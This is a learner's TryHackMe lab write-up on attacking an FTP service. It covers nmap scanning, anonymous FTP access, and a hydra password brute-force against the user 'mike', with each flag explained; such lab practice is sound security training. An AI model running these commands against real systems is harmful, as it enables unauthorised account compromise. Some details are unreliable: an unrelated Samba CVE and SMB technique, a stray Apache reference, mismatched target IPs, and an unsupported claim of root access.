# Documentation: TryHackMe Exploiting FTP #03

## 1. Introduction
- **Purpose**: Document my experience and share knowledge on the Cyber Defense challenges
- **Scope**:  Learn the fundamental components of detecting and responding to threats in a corporate environment

## 2. Setup
- **Environment**: Kali Linux via VirtualBox
- **Accounts and Access**: Created a TryHackMe account and accessed the room via OpenVPN

## 3. Challenge Walkthrough

### 3.1 Room Name: Network Services
- **Objective**: Access an FTP server and capture the flag by enumerating information then exploiting its vulnerabilities to exfiltrate sensitive data and gain access to the server and capture the flag

### 3.2 Enumeration
- **Initial Scanning**:
  - **Tools and Commands**:
    - Port Scanning & ftp server enumeration:
      - `nmap -A 10.10.40.220` -v
    	- `nmap -Pn 10.10.40.220` -v
      - Enter `ftp 10.10.40.220` to connect to the ftp server
      - Log in user as `anonymous` password press enter
      - Enter `ls` then `get PUBLIC_NOTICE.txt` to download the file to your local folder
      - Enter `cat PUBLIC_NOTICE.txt` in cli to open file to read contents

  - **Findings**:
      - Open port HTTP running on 80/tcp
      - Open port FTP running on 21/tcp
      - There's a file called PUBLIC_NOTICE.txt
      - There's a variant ftp version vsFTPd 3.0.3
      - FTP login as Anonymous is allowed
      - A possible username called, Mike
	![image](https://github.com/abelmorad/TryHackMe-CDA-Exploiting-FTP/assets/110463619/8e74319a-2ff8-4579-8c8b-9c3ab42c3a15)
  ![image](https://github.com/abelmorad/TryHackMe-CDA-Exploiting-FTP/assets/110463619/1b5f1a6d-8305-4dab-902c-85eca9a4befb)
  ![image](https://github.com/abelmorad/TryHackMe-CDA-Exploiting-FTP/assets/110463619/fc89cc76-e533-4a52-9bc8-2f1b89a2a87f)


### 3.3 Exploitation
- **Vulnerability Identification**: [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)
  - **Techniques Used**:  exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.

- **Exploitation Process**:
      - Enter `hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt.gz -vV 10.10.185.60 ftp`
      - Syntax breakdown:
  	-Let's break it down:
-hydra                   Runs the hydra tool
-t 4                    Number of parallel connections per target
-l [user]               Points to the user who's account you're trying to compromise
-P [path to dictionary] Points to the file containing the list of possible passwords
-vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt
-[machine IP]            The IP address of the target machine
-ftp / protocol          Sets the protocol
  ![image](https://github.com/abelmorad/TryHackMe-CDA-Exploiting-FTP-03/assets/110463619/49d232e3-475b-443b-88ec-cda3b7d247a9)


## 4. Analysis and Reflection
- **Challenges Faced**: Difficulty in identifying the exact version of Apache.
- **Learnings**: Importance of thorough enumeration.
- **Improvements**: Try alternative enumeration techniques earlier.

## 5. Conclusion
- **Summary**: Successfully gained root access and captured the flag

## 6. References
- [TryHackMe](https://tryhackme.com)
- [Nmap Documentation](https://nmap.org/book/man.html)

